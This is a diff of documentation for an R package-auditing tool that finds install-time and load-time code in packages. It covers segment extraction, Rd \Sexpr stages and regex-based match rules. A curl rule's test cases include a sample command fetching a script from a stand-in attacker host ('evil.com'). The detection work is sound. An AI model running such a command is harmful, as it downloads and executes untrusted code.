@@ -42,23 +42,24 @@ of extracted files.
    source package. This is the only discovery step: every file the scan reads
    is found by a file-context rule.
 
-2. For each file found, `read_code()` reads it into one or more *streams* of
-   code, dispatching on the rule's `type`. A stream is a run of code in one
-   language, tagged with the code context it belongs to. Most files hold one;
-   a help file holds two.
+2. For each file found, `extract_segments()` reads it into one or more
+   *segments* of code, dispatching on the rule's `type`. A segment is a
+   contiguous, line-aligned run of code in one language, tagged with the code
+   context it belongs to. Most files hold one; a help file holds two.
 
-   a. `R`: the file's own lines.
+   a. `R`: `read_code()` returns the file's own lines.
 
-   b. `Rd`: `extract_Rd_code()` recovers the `\examples{}` code as one stream
+   b. `Rd`: `extract_Rd_code()` recovers the `\examples{}` code as one segment
       and the `\Sexpr{}` code as another.
 
-   c. `shell` and `make`: the file's lines, for matching rather than parsing.
+   c. `shell` and `make`: `read_code()` returns the file's lines, for matching
+      rather than parsing.
 
-   d. `other`: no stream. The file is reported but never read.
+   d. `other`: no segment. The file is reported but never read.
 
-3. For each stream, dispatching on its language:
+3. For each segment, `analyze_segment()` dispatches on its language:
 
-   a. `shell`: `find_regex()` matches every regex rule against the lines.
+   a. `shell`: `find_matches()` matches every match rule against the lines.
 
    b. `R`: `parse_code()` uses R's `parse()` and the `xmlparsedata` and `xml2`
       packages to return an XML parse tree, then `find_code_contexts()` and
@@ -67,25 +68,25 @@ of extracted files.
 
    c. If any patterns were found, `determine_code_contexts()` determines
       whether each occurrence is in a named code context, top-level code
-      (`Top-level`), or a regular function (`Other`). A stream from a help file
+      (`Top-level`), or a regular function (`Other`). A segment from a help file
       brings its own context, so only the `Top-level`/`Other` distinction is
-      computed there and top-level code takes the stream's context.
+      computed there and top-level code takes the segment's context.
 
 4. Finally, the lifecycle phases in which each finding's code runs are attached
    to the findings. A file or code context takes its phases from the rule that
    matched it; a pattern inherits them from the code context assigned in
-   step 3c; an expression inherits them from the file context it was found in.
+   step 3c; a match inherits them from the file context it was found in.
 
 `audit_package()` returns a `pkgaudit` object: a named list of `file_contexts`,
-`code_contexts`, `patterns`, `expressions`, and `errors` data frames, plus a
+`code_contexts`, `patterns`, `matches`, and `errors` data frames, plus a
 `metadata` list recording what was scanned and with what. Each of the four
 findings data frames carries one logical column per lifecycle phase.
 
 Failures are contained rather than fatal. Listing files, reading a file,
 parsing code, and evaluating an XPath or a regular expression are each wrapped
 in `tryCatch()`, so an unreadable file, a malformed script, or an invalid
-expression is recorded as a row in `errors` -- giving the stage, file, rule, and
-message -- and the scan continues with the next file, stream, or rule.
+expression is recorded as a row in `errors` -- giving the step, file, rule, and
+message -- and the scan continues with the next file, segment, or rule.
 
 ## What pkgaudit Does Not Do
 
@@ -105,7 +106,7 @@ under audit.
 ## Rules
 
 The remainder of this document explains each category of rule and how the
-functions above are used to find the context, pattern, or expression it targets.
+functions above are used to find the context, pattern, or match it targets.
 
 Rules are defined by YAML files that live under `inst/rules/`. For all four
 categories, the YAML files have the following fields:
@@ -119,12 +120,12 @@ should and should not be found by the rule, respectively.
 File and code context rules carry nine further fields, one per lifecycle phase
 -- `at_autoconf`, `at_build`, `at_check`, `at_install_src`, `at_install_bin`,
 `at_load`, `at_attach`, `at_unload`, and `at_detach` -- each `TRUE` or `FALSE`.
-Pattern and regex rules do not declare them: a pattern runs when the code around
+Pattern and match rules do not declare them: a pattern runs when the code around
 it runs, so it takes its phases from the code context that contains it, and an
-expression takes its phases from the file context it was found in.
+match takes its phases from the file context it was found in.
 
 Each rule contains additional fields used by pkgaudit functions to find file
-contexts, code contexts, patterns, or expressions. These are explained below.
+contexts, code contexts, patterns, or matches. These are explained below.
 
 The helper below prints a rule's YAML, stopping before its examples, which are
 discussed at the end.
@@ -150,16 +151,19 @@ has five additional fields:
 
 - `type` is the format of the file, and selects how it is read: `R` is parsed as
   it stands, `Rd` has its `\examples{}` and `\Sexpr{}` code extracted first,
-  `shell` and `make` are matched line by line against the regex rules, and
+  `shell` and `make` are matched line by line against the match rules, and
   `other` is reported but never read.
 - `path` is the directory to search (relative to the package root).
 - `recursive` indicates whether to descend into subdirectories.
-- `report` indicates whether a match is a finding in its own right. Every rule
-  is used to find files to scan; only a reporting rule contributes a row to the
-  `file_contexts` frame. The rules covering `R/` and `man/` exist to tell the
-  scan what to read, so they do not report, and the frame stays a short list of
-  security-relevant files rather than an inventory of the package.
-- `pattern` is a regular expression matched against the names of the files found
+- `report` indicates whether a match is a finding in its own right. It is
+  `TRUE` for a file that both executes automatically during some lifecycle
+  phase and is matched as text rather than parsed -- in practice the shell and
+  Make-like files, whose contents pkgaudit cannot report on with any precision,
+  so the file itself is the finding. Everything else is scanned just as
+  thoroughly; only the row asserting the file exists is withheld, and the frame
+  stays a short list of files someone has to read rather than an inventory of
+  the package.
+- `filename` is a regular expression matched against the names of the files found
   at the file path (recursively, if `recursive: TRUE`).
 
 `find_file_contexts()` passes the `path`, `recursive`, and `pattern` values to
@@ -205,7 +209,7 @@ and `pattern` values:
 ```{r fc-row}
 rules$file_contexts[
   rules$file_contexts$name %in% c("configure", "R_scripts", "man_pages"),
-  c("name", "type", "path", "recursive", "report", "pattern")
+  c("name", "type", "path", "recursive", "report", "filename")
 ]
 ```
 
@@ -389,11 +393,13 @@ before any pattern rule can be applied to it.
 
 `extract_Rd_code()` does that recovery, working from `tools::parse_Rd()`'s parse
 tree rather than by matching text, so brace nesting, `%` comments and the `\%`,
-`\\` and `\{` escapes are handled by R's own Rd parser. It returns two streams,
+`\\` and `\{` escapes are handled by R's own Rd parser. It returns two code
+strings,
 because a help file carries R code in two places that run at different times:
 
 - `\examples{}`, which `R CMD check` runs.
-- `\Sexpr{}`, which is evaluated whenever the page is rendered.
+- `\Sexpr{}`, which is evaluated whenever the page is processed. It is returned
+  as one string per stage, because the three stages run at different times.
 
 ```{r rd-extract, comment = ""}
 rd <- tempfile(fileext = ".Rd")
@@ -411,12 +417,12 @@ code <- pkgaudit:::extract_Rd_code(rd)
 cat(code$examples)
 ```
 
-Both streams are padded so that line *N* of the extracted text is line *N* of
+Both are padded so that line *N* of the extracted text is line *N* of
 the `.Rd` file. A pattern found in them therefore reports the line it occupies
 in the original help file, with no offset to apply:
 
 ```{r rd-lines}
-cat(code$sexpr)
+cat(code$sexpr$install)
 ```
 
 `\dontrun{}`, `\donttest{}`, `\dontshow{}` and `\testonly{}` are all unwrapped.
@@ -424,10 +430,17 @@ Whether that code is reached is a question for the reviewer; all four ship in
 the package, and `\dontshow{}` in particular runs during checks without
 appearing on the rendered page.
 
-Because the two streams run at different phases, each becomes a computed code
-context of its own -- `Rd_examples` and `Rd_Sexpr` -- alongside `Top-level` and
-`Other`. A pattern inside a function definition in an example is still `Other`:
-it runs only if something calls it, exactly as in a script.
+Because these run at different phases, each becomes a computed code context of
+its own -- `Rd_examples`, and one per `\Sexpr` stage: `Rd_Sexpr_build`,
+`Rd_Sexpr_install` and `Rd_Sexpr_render`. The unlabelled `\Sexpr` above is the
+install stage, which is what Writing R Extensions gives as the default. A
+pattern inside a function definition in an example is still `Other`: it runs
+only if something calls it, exactly as in a script.
+
+Code inside `\dontrun{}` or `\donttest{}` keeps its context and its phases but
+is flagged in the `guarded` column, because `R CMD check` does not run it. The
+phases it carries are therefore an upper bound. `\dontshow{}` and
+`\testonly{}` *are* run by check, so they are not guarded.
 
 User-defined Rd macros are expanded when the package defines any, so a
 `\Sexpr{}` reaching a page through a macro is found and reported against the
@@ -439,28 +452,28 @@ nothing to find there until the macro is expanded somewhere.
 
 An expression is a regular-expression match in a file that R executes through a
 shell or through make, such as `configure` and `src/Makevars`. Those files are
-already reported as file contexts; a regex rule says what to look for inside
+already reported as file contexts; a match rule says what to look for inside
 one. The goal is to separate a `configure` script that probes for a C library
 from one that downloads and runs a remote payload.
 
-In addition to the common fields, a regex rule has two additional fields:
+In addition to the common fields, a match rule has two additional fields:
 
 - `regex` is the regular expression that defines the expression, single-quoted
   in the YAML so that backslashes reach the engine unchanged.
 - `attck` is a set of MITRE ATT&CK technique identifiers, carried into each
   finding and tallied by `summary()`.
 
-A regex rule declares no `type`. The other three categories name the language of
-what they match; a regex rule is applied to every file context typed `shell` or
+A match rule declares no `type`. The other three categories name the language of
+what they match; a match rule is applied to every file context typed `shell` or
 `make` and to no other file, so a type of its own would only restate that.
 
 ```{r rx-yaml, comment = ""}
 show_rule("regex", "regex_curl.yaml")
 ```
 
-`find_regex()` reads the file as lines and calls `base::gregexpr()` with
+`find_matches()` reads the file as lines and calls `base::gregexpr()` with
 `perl = TRUE`, `ignore.case = FALSE`, and `useBytes = FALSE`. Every match
-becomes an expression finding recording the rule's name, the line, and the
+becomes a match recording the rule's name, the line, and the
 character position the match begins at; a line matched twice yields two
 findings.
 
@@ -469,7 +482,7 @@ merely contains the letters `curl`. Neither consumes a character, so they bound
 the match without becoming part of it.
 
 ```{r rx-match}
-rx    <- rules$regex$regex[rules$regex$name == "curl"]
+rx    <- rules$matches$regex[rules$matches$name == "curl"]
 finds <- function(line) grepl(rx, line, perl = TRUE)
 
 finds("curl -s https://www.evil.com/evil.sh")      # a bare invocation
@@ -481,7 +494,7 @@ finds("CURL -s https://www.evil.com/x")            # matching is case-sensitive
 
 Matching text is weaker than matching a parse tree, and the trade is deliberate:
 a shell script has no R parse tree to match against, so the alternative is not a
-more precise rule but no coverage at all. An expression in a comment, a quoted
+more precise rule but no coverage at all. A match in a comment, a quoted
 string, or a branch that never runs is reported the same as one in a live
 command, and a command assembled from shell variables is not reported at all.
 
@@ -507,7 +520,7 @@ source, so `Top-level` carries the build, check, and source-install phases.
 ordinary function runs only if something calls it, never as a consequence of
 building, installing, checking, or loading the package.
 
-An expression needs none of this. It is found in a file context rather than a
+A match needs none of this. It is found in a file context rather than a
 code context, so its phases are simply those of the file it sits in, and where a
 file matches more than one file-context rule it takes the phases of every rule
 that matched.
